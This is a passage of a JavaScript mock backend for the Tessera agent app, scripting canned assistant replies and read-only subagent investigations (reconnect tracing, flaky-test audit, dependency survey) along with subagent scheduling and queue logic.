      thinking: `Private chat, so no files, memory or history, only what they say here. "${truncate(q, 90)}" doesn't need anything current: answer directly.`,
      text: withAck(isGreeting(text)
        ? `Hi! Ask me anything. If the answer depends on something current, I'll search the web for it.\n\n${PRIVATE_NOTE}`
        : md`
Here's my take on *"${q}"*:

- Start with the simplest version that does what you need, then check it against the real requirement
- When there's a trade-off, pick the side you'd regret least in a month
- If it hinges on anything recent (prices, releases, news), ask and I'll search the web

Want me to go deeper on any part?

${PRIVATE_NOTE}`),
    });
    return;
  }
  const query = keywords(text, 6).join(' ') || q;
  const results = privateResults(query);
  await t.step({
    thinking: `"${truncate(q, 90)}" needs something current or checkable. In a private chat the web is the only tool: search once, then answer with links.`,
    text: 'Let me look that up.',
    calls: [{ name: 'web_search', args: { query }, exec: { duration: 900, text: searchResultText(query, results) } }],
  });
  await t.step({
    thinking: 'Three usable results. Lead with the answer, cite the pages, and be honest that the forum thread is anecdotal.',
    text: withAck(md`
**Short answer:** on *"${q}"*, the sources agree on the basics: start with the well-reviewed default and only pay for extras you'll actually use.

${sourceBullets(results)}

The comparison page is the most useful of the three; the forum thread is worth a skim for gotchas, but it's anecdotal.

${PRIVATE_NOTE}`),
  });
}

// ─── subagents (tools/meta.rs `agent`, engine spawn_subagents / deliver_report) ─
const readCall = (p, text) => ({ name: 'read', args: { path: p }, exec: { duration: 400, text } });
const grepCall = (pattern, p, text) => ({ name: 'grep', args: { pattern, path: p }, exec: { duration: 400, text } });
const RECONNECT_RS = md`
pub async fn connect_with_retry(endpoints: &[Endpoint], policy: &BackoffPolicy) -> Result<Conn> {
    let mut attempt = 0;
    loop {
        for ep in endpoints {
            match Conn::open(ep).await {
                Ok(conn) => return Ok(conn), // attempt starts at 0 again on the next call
                Err(err) if err.is_auth() => return Err(err),
                Err(err) => tracing::debug!(%err, attempt, "reconnect failed"),
            }
        }
        attempt += 1;
        tokio::time::sleep(backoff(policy, attempt)).await;
    }
}

fn backoff(policy: &BackoffPolicy, attempt: u32) -> Duration {
    let cap = policy.max.min(policy.base * 2u32.saturating_pow(attempt));
    cap.mul_f64(rand::random::<f64>()) // full jitter
}`;
const CLIENT_RUN_RS = md`
    pub async fn run(&self) -> Result<()> {
        loop {
            let conn = reconnect::connect_with_retry(&self.endpoints, &self.policy).await?;
            conn.call(Request::Hello { client: "tessera-cli".into(), version: VERSION.into() }).await?;
            self.resync(&conn).await?;
            self.pump(&conn).await; // returns when the socket closes
        }
    }

    async fn resync(&self, conn: &Conn) -> Result<()> {
        let mut open = self.open.lock().await;
        for (id, last) in open.iter_mut() {
            let snap = conn.call(Request::GetSession { session_id: id.clone(), since_seq: Some(*last) }).await?;
            for entry in snap.entries {
                self.events.send(ClientEvent::Entry(id.clone(), entry)).ok();
            }
            *last = snap.info.last_seq;
        }
        Ok(())
    }`;
const WS_TEST_RS = md`
async fn start_server() -> SocketAddr {
    let addr: SocketAddr = "127.0.0.1:18080".parse().unwrap();
    tokio::spawn(tessera_server::serve(test_config(addr)));
    tokio::time::sleep(Duration::from_millis(100)).await; // let the server start
    addr
}`;
const STEER_TEST_RS = md`
    #[tokio::test]
    async fn steer_injects_after_tool_batch() {
        let (agent, mut events) = test_agent(slow_tool(Duration::from_millis(30))).await;
        agent.send("start").await;
        tokio::time::sleep(Duration::from_millis(20)).await;
        agent.steer("actually, stop after this").await;
        let entries = collect_until_idle(&mut events).await;
        assert_eq!(entries[3].text(), "actually, stop after this");
    }`;
const TUNGSTENITE_CHANGELOG = [
  '# 0.28.1', '- Fix a panic when the peer closes the connection while a frame is being flushed.', '',
  '# 0.28.0', '- Update tungstenite to 0.28: close frames with a reason longer than 123 bytes are now rejected instead of truncated.',
  "- `WebSocketStream::close` now waits for the peer's close frame (with a timeout) instead of returning immediately.",
].join('\n');
/**
 * Task templates for the subagent scenario and the seeded chat. `steps` are the child's tool steps (a live
 * child runs the first 3–6), `report` its final answer, `gist`/`next` feed the parent's summary.
 */
const SUBTASKS = [
  {
    name: 'Map the reconnect path',
    prompt: 'Trace how the Tessera client reconnects after its WebSocket drops (crates/client): what schedules the retry, how the backoff is computed and when it resets, and how session state is resynchronised with `get_session { since_seq }`. Read-only: do not change any files. Give file:line for each step and flag anything that could lose or duplicate entries.',
    opener: 'Starting with every mention of reconnecting in the client.',
    steps: [
      { thinking: 'Find every place that mentions reconnecting or backoff, so I know which files matter.', call: grepCall('reconnect|backoff', 'crates/client/src', [
        'crates/client/src/lib.rs:41:mod reconnect;',
        'crates/client/src/lib.rs:117:            let conn = reconnect::connect_with_retry(&self.endpoints, &self.policy).await?;',
        'crates/client/src/reconnect.rs:12:pub struct BackoffPolicy {',
        'crates/client/src/reconnect.rs:27:pub async fn connect_with_retry(endpoints: &[Endpoint], policy: &BackoffPolicy) -> Result<Conn> {',
        'crates/client/src/reconnect.rs:36:                Err(err) => tracing::debug!(%err, attempt, "reconnect failed"),',
        'crates/client/src/reconnect.rs:44:fn backoff(policy: &BackoffPolicy, attempt: u32) -> Duration {',
      ].join('\n')) },
      { thinking: 'reconnect.rs owns the loop. Read it.', call: readCall('crates/client/src/reconnect.rs', numbered(RECONNECT_RS, 27)) },
      { thinking: 'The attempt counter is local, so every call starts at zero with no delay. Now: how is state resynchronised?', call: grepCall('since_seq|resync', 'crates/client/src', [
        'crates/client/src/lib.rs:119:            self.resync(&conn).await?;',
        'crates/client/src/lib.rs:124:    async fn resync(&self, conn: &Conn) -> Result<()> {',
        'crates/client/src/lib.rs:127:            let snap = conn.call(Request::GetSession { session_id: id.clone(), since_seq: Some(*last) }).await?;',
      ].join('\n')) },
      { thinking: 'Read run() and resync() together.', call: readCall('crates/client/src/lib.rs', numbered(CLIENT_RUN_RS, 114)) },
      { thinking: 'Check the history of this file for anything that changed the reset behaviour.', call: bashCall('git log --oneline -4 -- crates/client/src/reconnect.rs', [
        '4b7a0d2 client: wait for entry_added in the reconnect test', 'a91e3f7 client: try LAN endpoint before remote',
        '5c20d8e client: full jitter for reconnect backoff', '18f4b6a client: first reconnect loop',
      ].join('\n')) },
      { thinking: 'Does anything apply the snapshot\'s streaming field?', call: grepCall('streaming', 'crates/client/src/lib.rs', 'No matches for `streaming` in crates/client/src/lib.rs') },
    ],
    wrap: 'Enough to report: the loop itself is fine; the reset point and the ignored streaming snapshot are the two real issues.',
    report: md`
## Reconnect path

\`Client::run\` (\`crates/client/src/lib.rs:115\`) drives the loop:

1. \`connect_with_retry\` (\`reconnect.rs:27\`) tries each endpoint in order, LAN first, then remote
2. On failure it sleeps \`backoff(attempt)\`: full jitter over \`base · 2^attempt\`, capped at \`max\` (\`reconnect.rs:44\`)
3. Once connected: \`hello\`, then \`resync\` (\`lib.rs:124\`) calls \`get_session { since_seq }\` for every open session
4. \`pump\` forwards events until the socket closes, and the loop starts over

**Problems**
- The attempt counter lives inside \`connect_with_retry\`, so it resets on every successful handshake. A server that accepts and immediately drops connections gets hammered: the first retry has no delay at all
- \`resync\` ignores \`snap.streaming\`, so a reply that was mid-stream stays blank until its next delta arrives

~~~rust
let healthy = tokio::time::timeout(Duration::from_secs(5), self.pump(&conn)).await.is_err();
if healthy { attempt = 0; }
~~~

**Recommendation:** keep the attempt counter in \`run\` and reset it only after ~5 s of healthy connection (above), and apply \`snap.streaming\` in \`resync\`. Both are small changes contained in \`crates/client\`.`,
    gist: 'the retry loop is sound, but the backoff resets on every handshake (a flapping server gets hammered) and `resync` drops the in-progress stream',
    next: 'move the backoff reset to "healthy for 5 s" in `crates/client`',
  },
  {
    name: 'Audit test flakiness',
    prompt: 'Find tests in the Tessera workspace that are likely to be flaky: sleeps used for synchronisation, timeouts under a second, shared global state (ports, temp dirs, env vars) and order-dependent assertions. Read-only: do not change any files. Rank the worst offenders with file:line and a one-line fix for each.',
    opener: 'Looking for sleeps first; they are the usual suspects.',
    steps: [
      { thinking: 'Sleeps used for synchronisation are the classic cause. Grep for them.', call: grepCall('sleep\\(', 'crates', [
        'crates/client/tests/reconnect.rs:88:    tokio::time::sleep(Duration::from_millis(50)).await;',
        'crates/server/tests/ws.rs:37:    tokio::time::sleep(Duration::from_millis(100)).await; // let the server start',
        'crates/core/src/agent.rs:612:        tokio::time::sleep(Duration::from_millis(20)).await;',
      ].join('\n')) },
      { thinking: 'Sub-second timeouts next.', call: grepCall('from_millis\\(\\d{1,3}\\)\\)', 'crates', [
        'crates/client/tests/reconnect.rs:61:    let snap = timeout(Duration::from_millis(500), client.get_session(&id, Some(last))).await??;',
        'crates/server/tests/pair.rs:23:    let resp = timeout(Duration::from_millis(250), pair(&addr, code)).await??;',
      ].join('\n')) },
      { thinking: 'How many tests are there in total, for scale?', call: bashCall("cargo test --workspace -q -- --list 2>/dev/null | grep -c ': test$'", '47') },
      { thinking: 'The server test sleeps "to let the server start". Read it.', call: readCall('crates/server/tests/ws.rs', numbered(WS_TEST_RS, 34)) },
      { thinking: 'And the agent test that sleeps 20 ms.', call: readCall('crates/core/src/agent.rs', numbered(STEER_TEST_RS, 607)) },
      { thinking: 'Shared state: environment variables are process-wide.', call: bashCall('grep -rn "set_var" crates/*/tests', [
        'crates/server/tests/ws.rs:12:    std::env::set_var("TESSERA_HOME", tmp.path());',
        'crates/server/tests/pair.rs:9:    std::env::set_var("TESSERA_HOME", tmp.path());',
      ].join('\n')) },
      { thinking: 'Are the env-var tests serialised anywhere?', call: grepCall('serial_test|#\\[serial\\]', 'crates', 'No matches for `serial_test|#\\[serial\\]` in crates') },
    ],
    wrap: 'Four real offenders. Rank by how often they would bite in CI.',
    report: md`
## Flaky-test audit

47 tests in the workspace; four are timing- or state-dependent. Worst first:

1. \`crates/server/tests/ws.rs:35\`: fixed port \`18080\` plus a 100 ms sleep "to let the server start". Breaks under parallel runs and on slow CI boxes. **Fix:** bind \`127.0.0.1:0\` and return the real address
2. \`crates/server/tests/{ws,pair}.rs\`: both \`set_var("TESSERA_HOME")\` with no serialisation, and env vars are process-wide. **Fix:** pass the home directory through the config
3. \`crates/core/src/agent.rs:612\`: \`steer_injects_after_tool_batch\` sleeps 20 ms and hopes the 30 ms tool is still running. **Fix:** wait for \`ToolStarted\` before steering
4. \`crates/client/tests/reconnect.rs:61\`: a 500 ms timeout on a resync is tight on CI. **Fix:** 5 s; it only guards against a hang

~~~sh
cargo test --workspace -- --test-threads=16   # reproduces 1 and 2 within a few runs
~~~

No assertion depends on test order.

**Recommendation:** fix 1 and 2 first (they explain most CI failures), then 3.`,
    gist: 'four timing- or state-dependent tests; the fixed port and start-up sleep in `server/tests/ws.rs` and the unserialised `TESSERA_HOME` env var explain most CI failures',
    next: 'bind port 0 and drop `set_var` in the server tests',
  },
  {
    name: 'Survey upstream fixes',
    prompt: 'Check whether the WebSocket stack Tessera depends on (tokio-tungstenite, axum, tokio) has fixed anything since our pinned versions that touches close handling, broadcast lag or reconnects. Read-only: do not change any files or Cargo.lock. Summarise what is relevant to us and whether upgrading is worth it.',
    opener: 'First, which versions are we pinned to?',
    steps: [
      { thinking: 'Pinned versions from Cargo.lock.', call: bashCall('grep -A1 -E \'^name = "(tokio|tokio-tungstenite|axum)"$\' Cargo.lock', [
        'name = "axum"', 'version = "0.8.6"', '--', 'name = "tokio"', 'version = "1.48.0"', '--', 'name = "tokio-tungstenite"', 'version = "0.27.0"',
      ].join('\n')) },
      { thinking: 'Latest tokio-tungstenite?', call: bashCall('cargo search tokio-tungstenite --limit 1', 'tokio-tungstenite = "0.28.1"    # Tokio binding for Tungstenite, the Lightweight stream-based WebSocket implementation') },
      { thinking: 'Two releases ahead. Read the changelog.', call: readCall('~/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/tokio-tungstenite-0.28.1/CHANGELOG.md', numbered(TUNGSTENITE_CHANGELOG)) },
      { thinking: 'The close() change matters only if we call close. Do we?', call: grepCall('\\.close\\(', 'crates', [
        'crates/server/src/ws.rs:97:    let _ = socket.close().await;', 'crates/client/src/lib.rs:156:        conn.close().await.ok();',
      ].join('\n')) },
      { thinking: 'Now axum.', call: bashCall('cargo search axum --limit 1', 'axum = "0.8.7"    # Web framework that focuses on ergonomics and modularity') },
      { thinking: 'One patch release. What changed?', call: readCall('~/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/axum-0.8.7/CHANGELOG.md', numbered([
        '# 0.8.7', '- **fixed:** `WebSocketUpgrade` no longer drops the first message when the client sends it in the same packet as the upgrade request.',
      ].join('\n'))) },
    ],
    wrap: 'Both upgrades are cheap and relevant. Summarise in a table.',
    report: md`
## Upstream fixes since our pins

| Crate | Pinned | Latest | Relevant? |
|---|---|---|---|
| tokio-tungstenite | 0.27.0 | 0.28.1 | **Yes** |
| axum | 0.8.6 | 0.8.7 | Yes, small |
| tokio | 1.48.0 | 1.48.0 | No change |

- **tokio-tungstenite 0.28.1** fixes a panic when the peer closes mid-flush: exactly what a phone dropping off Wi-Fi does
- **0.28.0** makes \`close()\` wait for the peer's close frame, so \`socket.close().await\` in \`crates/server/src/ws.rs:97\` becomes a clean shutdown
- **axum 0.8.7** stops dropping a message sent in the same packet as the upgrade (our client's \`hello\` can be)

**Recommendation:** upgrade both: a patch bump for axum and one minor for tokio-tungstenite. The only behaviour change is \`close()\` waiting for the peer, which our code already expects.`,
    gist: 'worth upgrading: tokio-tungstenite 0.28.1 fixes a panic on close mid-flush, and axum 0.8.7 stops dropping a first message sent with the upgrade',
    next: 'bump tokio-tungstenite to 0.28.1 and axum to 0.8.7',
  },
];
/** How long each live child runs: tool steps and per-tool duration (ms). Rotated per message. */
const CHILD_PROFILES = [{ steps: 3, lo: 500, hi: 900 }, { steps: 5, lo: 700, hi: 1100 }, { steps: 6, lo: 1100, hi: 1800 }];
let batchCounter = 0;
const numberWord = (n) => ['no', 'one', 'two', 'three', 'four', 'five', 'six', 'seven', 'eight'][n] ?? String(n);
const reportHeader = (name, steps, took, child) => `[Report from subagent "${name}" · ${steps} steps · ${took} · session ${child}]\n\n`;
function startedText(started) {
  return `Started ${started.length} subagent(s) in the background:\n${started.map(([n, id]) => `- ${n} (session ${id})`).join('\n')}\n\n` +
    "Their reports will arrive in this conversation as they finish, and you will be prompted to continue once all are done. Tell the user what you started; don't wait or poll. Use `agents` to check on or stop them.";
}
/** The parent's wrap-up once reports are in (background summary turn, or the answer after a foreground run). */
function subagentSummary(intro, agents) {
  const ok = agents.filter((a) => a.result?.ok);
  const lines = agents.map((a) => `- **${a.name}:** ${a.result?.ok ? a.task.gist : 'stopped before it finished, so there is nothing to act on yet'}`);
  const next = ok.map((a) => a.task.next);
  const plan = next.length > 1 ? next.map((s, i) => `(${i + 1}) ${s}`).join(', ') : next[0];
  return md`
${intro} Here's the short version:

${lines.join('\n')}

${plan ? `**What I'd do next:** ${plan}. Each is small and independent. Want me to start on a branch and run the suite afterwards?` : 'Nothing finished, so there are no findings yet. Want me to run them again?'}`;
}
/** A child's own turn: 3–6 short tool steps, then its report. */
function childScenario(task, profile) {
  return async (t) => {
    const steps = task.steps.slice(0, Math.max(1, Math.min(profile.steps, task.steps.length)));
    for (const [i, s] of steps.entries()) {
      const ms = randInt(profile.lo, profile.hi);
      const exec = s.call.exec.chunks?.length
        ? { ...s.call.exec, chunks: s.call.exec.chunks.map(([c, d], j) => [c, j === 0 ? d + ms : d]) }
        : { ...s.call.exec, duration: ms };
      await t.step({ thinking: s.thinking, text: i === 0 ? task.opener : '', calls: [{ ...s.call, exec }] });
    }
    await t.step({ thinking: task.wrap, text: task.report });
  };
}
/** What a finished child produced: its last assistant text, or why it did not finish. */
function subResult(child, outcome) {
  if (outcome === 'ok') {
    const last = child?.entries.findLast((e) => e.kind === 'assistant' && textOf(e.content).trim());
    if (last) return { ok: true, text: textOf(last.content).trim() };
    return { ok: false, error: 'the subagent finished without a final answer' };
  }
  return { ok: false, error: outcome === 'aborted' ? 'stopped by the user' : 'the subagent failed' };
}
const MAX_SUBAGENTS = 4; // engine: config `agent.max_subagents`, the default number at once in a chat
const HELPER_MAX = 0xffff_ffff; // engine/helper_limits.rs MAX_LIMIT
const HELPER_CAPACITY = 16; // engine/helper_limits.rs: what this "machine" carries at once, all chats together
/** How many helpers `parentId` may have working at once (Infinity: no limit). */
function chatLimit(slots, parentId) {
  const own = state.sessions.get(parentId)?.info.helper_limits?.at_once;
  if (!slots.enabled) return 0;
  const n = own ?? slots.max;
  return n === 0 ? Infinity : n;
}
const roomFor = (slots, parentId) => slots.busy < slots.capacity && (slots.chats.get(parentId) ?? 0) < chatLimit(slots, parentId);
function takeSlot(slots, parentId, delta) {
  slots.busy += delta;
  slots.chats.set(parentId, (slots.chats.get(parentId) ?? 0) + delta);
}
/**
 * Create a child session under `parent` (engine start_child) and run its turn once a subagent slot is free
 * (engine finish_child); `onDone(outcome)` when it ends. A child waiting for a slot already has its prompt, 0
 * steps, status running and `helper_queued`. `task.scenario()` overrides the default child turn.
 */
function startChild(parent, task, profile, onDone) {
  const p = parent.info;
  const slots = state.slots;
  // Its chat's turn order first: never ahead of an earlier one still waiting.
  const free = roomFor(slots, p.id) && !slots.queue.some((w) => w.parent === p.id);
  const child = createSession({
    kind: 'subagent', title: `↳ ${task.name}`, cwd: task.cwd ?? p.cwd, model: task.model ?? p.model, thinking: p.thinking,
    permission: task.readonly === false ? p.permission : 'read_only', parent_id: p.id, private: !!p.private, status: 'running',
    ...(task.agent ? { role: task.agent } : {}),
    ...(sessionBot(parent) ? { bot_id: p.bot_id } : {}),
  });
  if (task.parent_call) child.info.parent_call = task.parent_call;
  child.info.helper_owner = 'tessera';
  if (!free) child.info.helper_queued = true; // still `running` for older apps
  child.bridgedHelper = !!task.parent_call;
  // Its task is the starting agent's words (its bot, or the chat), not the user's.
  addEntry(child, { kind: 'user', content: [{ type: 'text', text: task.prompt }], author: sessionBot(parent) ? p.bot_id : `chat:${p.id}` });
  child.info.preview = computePreview(child.entries);
  emitSession(child);
  const run = () => {
    let released = false;
    startTurn(child, task.prompt, task.scenario?.() ?? childScenario(task, profile), (outcome) => {
      if (!released) { released = true; takeSlot(slots, p.id, -1); pumpSlots(slots); }
      onDone(outcome);
    });
  };
  if (free) {
    takeSlot(slots, p.id, 1);
    run();
  } else {
    slots.queue.push({ id: child.info.id, parent: p.id, onDone, start: () => { delete child.info.helper_queued; child.info.status = 'running'; emitSession(child); run(); } });
  }
  return child;
}
/** Start waiting children, in order within each chat, while there is room. */
function pumpSlots(slots) {
  if (slots !== state.slots) return;
  const blocked = new Set();
  for (const w of [...slots.queue]) {
    if (!state.sessions.has(w.id)) { slots.queue.splice(slots.queue.indexOf(w), 1); w.onDone('aborted'); continue; }
    if (blocked.has(w.parent) || !roomFor(slots, w.parent)) { blocked.add(w.parent); continue; }
    slots.queue.splice(slots.queue.indexOf(w), 1);
    takeSlot(slots, w.parent, 1);
    w.start();
  }
}
/** Stop a child that is still waiting for a slot (it never runs); false when it isn't waiting. */
function unqueueChild(id) {
  const i = state.slots.queue.findIndex((w) => w.id === id);
  if (i < 0) return false;
  const [w] = state.slots.queue.splice(i, 1);
  const child = state.sessions.get(id);
  if (child) { delete child.info.helper_queued; setStatus(child, 'interrupted'); addEntry(child, { kind: 'notice', level: 'info', text: 'Stopped before it started.' }); }
  w.onDone('aborted');
  return true;
}
/** Stop a child, running or waiting. */
function stopChild(id) {
  const c = state.sessions.get(id);
  if (c?.turn) { abortTurn(c); if (c.info.steps === 0) setStatus(c, 'interrupted'); return true; }
  return unqueueChild(id);
}
/** `agent` with wait:false: start the children and return at once (the tool result the engine gives). */
function spawnBackground(parent, tasks, profiles, { summary } = {}) {
  const batch = { id: ++batchCounter, agents: [], stopped: false, summarized: false, summary };
  parent.batches.push(batch);
  for (const [i, task] of tasks.entries()) {
    const agent = { name: task.name, task, child: null, started: now(), done: false, stopped: false, result: null };
    batch.agents.push(agent);
    agent.child = startChild(parent, task, profiles[i], (outcome) => deliverReport(parent, batch, agent, outcome)).info.id;
  }
  return {
    text: startedText(batch.agents.map((a) => [a.name, a.child])),
    details: { subagents: batch.agents.map((a) => ({ name: a.name, session_id: a.child, background: true })) },
  };
}
/** A background child ended: post its report on the parent (engine deliver_report). */
function deliverReport(parent, batch, agent, outcome) {
  if (agent.done) return;
  agent.done = true;
  const child = state.sessions.get(agent.child);
  agent.result = subResult(child, outcome);
  if (state.sessions.get(parent.info.id) !== parent) return; // parent deleted (or state reset)
  const secs = Math.round((now() - agent.started) / 1000);
  const took = secs >= 60 ? `${Math.floor(secs / 60)} min` : `${secs} s`;
  const body = agent.result.ok ? agent.result.text : `The subagent did not finish: ${agent.result.error}`;
  const content = [{ type: 'text', text: reportHeader(agent.name, child?.info.steps ?? 0, took, agent.child) + body }];
  const author = `subagent:${agent.child}`;
  if (parent.turn) { // read at the parent's next step; never shown in `queued`
    parent.steers.push({ content, author });
    return;
  }
  addEntry(parent, { kind: 'user', content, author });
  parent.info.preview = computePreview(parent.entries);
  emitSession(parent);
  maybeSummarize(parent);
}
/** Once a whole (not stopped) batch has reported and the parent is idle, the parent sums up. */
function maybeSummarize(parent) {
  if (parent.turn || parent.compactTimer) return false;
  const batch = parent.batches.find((b) => !b.summarized && !b.stopped && b.agents.every((a) => a.done));
  if (!batch) return false;
  batch.summarized = true;
  parent.info.status = 'running';
  emitSession(parent);
  startTurn(parent, '', (t) => (batch.summary ?? scenarioSubagentSummary)(t, batch));
  return true;
}
/** Stop the background children of `parent` (abort/delete, like the engine's stop_background). */
function stopBackground(parent) {
  let n = 0;
  for (const batch of parent.batches) {
    const live = batch.agents.filter((a) => !a.done);
    if (!live.length) continue;
    batch.stopped = true;
    for (const agent of live) agent.stopped = true;
    // Waiting children first, so a stopped running one doesn't hand its slot to a sibling. Either way the
    // child's onDone delivers the "did not finish" report.
    for (const agent of live) unqueueChild(agent.child);
    for (const agent of live) if (!agent.done && !stopChild(agent.child)) deliverReport(parent, batch, agent, 'aborted');
    n += live.length;
  }
  return n;
}
/** `agent` with wait:true: stream progress, keep the call open until every child is done, return all reports. */
async function runForeground(turn, rt, tasks, profiles) {
  turn.toolOutput(rt, `Running ${tasks.length} subagent(s): ${tasks.map((x) => x.name).join(', ')}\n`);
  const agents = tasks.map((task) => ({ name: task.name, task, child: null, result: null }));
  const all = Promise.all(agents.map((agent, i) => new Promise((resolve) => {
    agent.child = startChild(turn.rec, agent.task, profiles[i], (outcome) => {
      agent.result = subResult(state.sessions.get(agent.child), outcome);
      resolve();
    }).info.id;
  })));
  // Aborting the parent stops its foreground children too.
  await turn.wait((done) => {
    all.then(done);
    return () => { agents.forEach((a) => unqueueChild(a.child)); agents.forEach((a) => stopChild(a.child)); };
  });
  turn.subagents = agents;
  const text = agents.map((a) => (a.result.ok ? `## ${a.name} (session ${a.child})\n${a.result.text}`
    : `## ${a.name} (failed) (session ${a.child})\nThe subagent did not finish: ${a.result.error}`)).join('\n\n');
  return {
    text, is_error: agents.every((a) => !a.result.ok),
    details: { subagents: agents.map((a) => ({ name: a.name, session_id: a.child, background: false })) },
  };
}
/** "subagent|parallel|delegate|research": split the work across 2–3 read-only subagents. */
/** The agent definitions (roles) the subagents scenario starts its tasks with; the third has none. */
const SUBTASK_ROLES = ['explore', 'review'];
async function scenarioSubagents(t, text, rec) {
  const bridge = rec.info.model.provider === 'claude-code';
  const wait = /\b(wait|foreground)\b/i.test(text);
  const tasks = SUBTASKS.slice(0, /\b(two|2)\b/i.test(text) ? 2 : 3).map((x, i) => (SUBTASK_ROLES[i] ? { ...x, agent: SUBTASK_ROLES[i] } : x));
  const shift = hashStr(text) % CHILD_PROFILES.length;
  const profiles = tasks.map((_, i) => CHILD_PROFILES[(i + shift) % CHILD_PROFILES.length]);
  const n = numberWord(tasks.length);
  await t.step({
    thinking: `This splits into ${n} independent investigations, and each would mean reading a lot of code. Delegate them to read-only subagents with self-contained prompts` +
      (wait ? ", and wait for the reports: I can't answer without them." : ' in the background, so the user can keep going while they work.'),
    text: wait ? `This splits into ${n} independent pieces, so I'll hand them to subagents and wait for their reports.`
      : `This splits into ${n} independent pieces. I'll hand them to subagents that run in the background, so you can keep chatting while they work.`,
    calls: [{
      name: bridge ? 'agents' : 'agent',
      args: { ...(bridge ? { action: 'start' } : {}), tasks: tasks.map(({ name, prompt }, i) => ({ name, prompt, readonly: true, ...(bridge ? { model: 'openai-codex/gpt-6' } : {}), ...(SUBTASK_ROLES[i] ? { agent: SUBTASK_ROLES[i] } : {}) })), wait },
      exec: { duration: 250, run: (turn, call, rt) => {
        const resolved = bridge ? tasks.map((x) => ({ ...x, model: { provider: 'openai-codex', model: 'gpt-6' }, parent_call: call.id })) : tasks;
        return wait ? runForeground(turn, rt, resolved, profiles) : spawnBackground(rec, resolved, profiles);
      } },
    }],
  });
  if (wait) {
    const agents = t.subagents ?? [];
    await t.step({
      thinking: 'All reports are back. Pull out what matters from each and propose an order of work.',
      text: subagentSummary(`${capFirst(n)} subagents are done.`, agents),
    });
    return;
  }
  await t.step({
    thinking: 'They are running. Tell the user what I started and that the reports will arrive on their own; no polling.',
    text: md`
I've started ${n} subagents in the background:

${tasks.map((x) => `- **${x.name}**`).join('\n')}

Each one works read-only in its own session and reports back here when it's done, usually within half a minute. I'll sum up once all ${n} are in; you can keep chatting in the meantime, or open one to watch it work.`,
  });
}
/** The parent's follow-up turn once every report of a background batch has arrived. */
async function scenarioSubagentSummary(t, batch) {
  const n = batch.agents.length;
  const all = batch.agents.every((a) => a.result?.ok);
  const count = n === 2 ? 'Both' : `All ${numberWord(n)}`;
  await t.step({
    thinking: `${count} reports are in. Pull out what matters from each and propose an order of work instead of repeating them.`,
    text: subagentSummary(all ? `${count} reports are in.` : `${count} subagents have reported back, but not all of them finished.`, batch.agents),
  });
}

// ─── subagent swarm: 32 small read-only checks, 4 at a time ─────────────────
const SWARM_CRATES = ['core', 'proto', 'server', 'client', 'cli', 'secure'];
const SWARM_MODULES = ['engine.rs', 'auth.rs', 'store.rs', 'sandbox.rs', 'remote.rs', 'providers.rs', 'jobs.rs', 'bots.rs', 'memory.rs',
  'skills.rs', 'tools/bash.rs', 'tools/files.rs', 'tools/web.rs', 'tools/policy.rs', 'llm/anthropic.rs', 'llm/openai_chat.rs', 'llm/responses.rs', 'llm/sse.rs'];
/** 24 targets: one per crate, one per core module (the seeded "Audit every crate"). */
const AUDIT_TARGETS = [
  ...SWARM_CRATES.map((c) => ({ name: `Audit crate: tessera-${c}`, path: `crates/${c}`, crate: c })),
  ...SWARM_MODULES.map((m) => ({ name: `Audit module: core/${m}`, path: `crates/core/src/${m}`, crate: 'core' })),
];
/** The live swarm's 32: the audit targets plus endpoints, RPCs and two UI areas. */
const SWARM_TARGETS = [
  ...AUDIT_TARGETS,
  ...['/api/health', '/api/pair', '/api/ws'].map((e) => ({ name: `Check endpoint ${e}`, path: 'crates/server/src/lib.rs', crate: 'server' })),
  ...['send', 'save_mosaics', 'cloudflare_setup'].map((m) => ({ name: `Check RPC: ${m}`, path: 'crates/core/src/engine.rs', crate: 'core' })),
  { name: 'Review UI: transcript rendering', path: 'apps/tessera/ui/src/components', crate: null },
  { name: 'Review UI: reconnect and resync', path: 'apps/tessera/ui/src/lib', crate: null },
];
const SWARM_FINDINGS = {
  clean: ['No `unwrap()` or `expect()` on untrusted input', 'Errors keep their context all the way up', 'Clippy is clean at the workspace lint level',
    'Tests cover the happy path and the main error path', 'No locks are held across an `.await`'],
  minor: [['2 `TODO`s left over from the last refactor', 'turn them into issues or finish them'],
    ['A `clone()` of a whole `Vec` where a borrow would do', 'pass a slice instead'],
    ['`#[allow(dead_code)]` hides an unused helper', 'delete the helper'],
    ['A `debug!` line logs a full request body', 'log its length instead']],
  major: [['A `std::sync::Mutex` guard is held across an `.await` (line 212)', 'take what you need and drop the guard before awaiting'],
    ['The error path of `open()` has no test', 'add a test with an unreadable file'],
    ['A 10 s timeout is hard-coded instead of read from the config', 'use `config.agent.timeout`'],
    ['An `unwrap()` on a header value a client controls (line 88)', 'return `bad_request` instead']],
};
const SWARM_PACE = { chunk: [24, 48], delay: [20, 30] };
/** One swarm task (deterministic per target): prompt, 2–4 tool steps, a 3–6 line report, verdict for the summary. */
function swarmTask(target) {
  const rnd = mulberry32(hashStr(target.name));
  const pick = (arr) => arr[Math.floor(rnd() * arr.length)];
  const roll = rnd();
  const level = roll < 0.6 ? 'clean' : roll < 0.87 ? 'minor' : 'major';
  const { path: p, crate } = target;
  const [finding, fix] = level === 'clean' ? [pick(SWARM_FINDINGS.clean), null] : pick(SWARM_FINDINGS[level]);
  const other = pick(SWARM_FINDINGS.clean.filter((f) => f !== finding));
  const file = p.endsWith('.rs') ? p : `${p}/src/lib.rs`;
  const steps = [
    { thinking: `Start with panics on untrusted input in ${p}.`, call: grepCall('unwrap\\(|expect\\(', p,
      level === 'major' && /unwrap/.test(finding) ? `${file}:88:        let v = req.headers().get("x-device").unwrap().to_str().unwrap();` : `No matches for \`unwrap\\(|expect\\(\` in ${p}`) },
    { thinking: 'Any leftover TODOs?', call: grepCall('TODO|FIXME', p,
      level === 'minor' && /TODO/.test(finding) ? `${file}:41:    // TODO: drop once every client sends attachments\n${file}:188:    // TODO: batch these writes` : `No matches for \`TODO|FIXME\` in ${p}`) },
    { thinking: 'What does the linter say?', call: crate
      ? bashCall(`cargo clippy -p tessera-${crate} -q 2>&1 | tail -n 2`, level === 'clean' ? '' : `warning: 1 warning emitted (${file})`)
      : bashCall(`npx tsc --noEmit -p apps/tessera/ui 2>&1 | tail -n 2`, '') },
    { thinking: 'Skim the top of the file for the overall shape.', call: readCall(file, numbered(`//! ${target.name.replace(/^[^:]*: /, '')}\n\nuse std::sync::Arc;\n\npub(crate) mod tests;`)) },
  ].slice(0, 2 + Math.floor(rnd() * 3));
  const verdict = level === 'clean' ? 'clean' : level === 'minor' ? '1 minor issue' : 'needs attention';
